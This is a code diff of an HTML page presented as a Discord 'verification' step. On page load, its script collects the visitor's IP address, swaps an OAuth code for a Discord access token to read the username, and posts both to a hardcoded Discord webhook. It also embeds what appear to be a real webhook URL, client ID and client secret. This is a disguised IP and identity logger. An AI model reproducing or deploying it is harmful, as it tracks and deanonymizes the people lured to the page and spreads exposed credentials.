@@ -1,28 +1,32 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Logging...</title>
+  <meta charset="UTF-8">
+  <title>Logging Info...</title>
 </head>
 <body>
-  <h1>verification successful!</h1>
+  <h1>Thank you for consenting. Logging information...</h1>
 
   <script>
-    async function sendLog() {
-      // Fetch user's IP
+    const webhookURL = 'https://discord.com/api/webhooks/1365223944260554814/E4PX9F9VhRdjWhiE2prcWjsW1Z5wzSA7eTWYgDljpJXS-wSveRDrD9-iMNomw7eVJWZQ'; // <--- put your webhook URL here
+    const clientID = '1365713195850924114';      // <--- put your Discord App client ID
+    const clientSecret = '_z3zDmEIRLmZw8Q5b8SD-98S07TvrDNl'; // <--- put your client secret
+    const redirectURI = 'https://dawahbrigades.github.io/verifyyy/';        // <--- should match your GitHub Page or server
+
+    // 1. Fetch user's IP
+    async function getIP() {
       const res = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
-      const ip = data.ip;
+      return data.ip;
+    }
 
-      // Your Discord webhook URL
-      const webhookURL = 'https://discord.com/api/webhooks/1365223944260554814/E4PX9F9VhRdjWhiE2prcWjsW1Z5wzSA7eTWYgDljpJXS-wSveRDrD9-iMNomw7eVJWZQ';
-
-      // Construct the message
+    // 2. Send IP + Username to Discord webhook
+    async function sendToDiscord(ip, username) {
       const payload = {
         username: "Logger Bot",
-        content: `**New User Log!**\nIP Address: ${ip}\n(Username will be posted separately)`
+        content: `**New User Logged!**\nIP Address: \`${ip}\`\nDiscord Username: **${username}**`
       };
 
-      // Send it to Discord
       await fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -30,7 +34,65 @@
       });
     }
 
-    sendLog();
+    // 3. If OAuth2 code is present, fetch the Discord username
+    async function getDiscordUsername(code) {
+      try {
+        // Step 1: Exchange code for access token
+        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            client_id: clientID,
+            client_secret: clientSecret,
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: redirectURI,
+            scope: 'identify email'
+          })
+        });
+
+        const tokenData = await tokenResponse.json();
+        const accessToken = tokenData.access_token;
+
+        if (!accessToken) {
+          throw new Error('Failed to get access token.');
+        }
+
+        // Step 2: Use token to fetch user info
+        const userResponse = await fetch('https://discord.com/api/users/@me', {
+          headers: {
+            Authorization: `Bearer ${accessToken}`
+          }
+        });
+
+        const userData = await userResponse.json();
+        return `${userData.username}#${userData.discriminator}`;
+      } catch (error) {
+        console.error('Error fetching Discord username:', error);
+        return 'Unknown User';
+      }
+    }
+
+    // 4. Get URL params
+    function getURLParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    // 5. Main logic
+    async function start() {
+      const code = getURLParam('code');
+      const ip = await getIP();
+      let username = 'Unknown User';
+
+      if (code) {
+        username = await getDiscordUsername(code);
+      }
+
+      await sendToDiscord(ip, username);
+    }
+
+    start();
   </script>
 </body>
 </html>
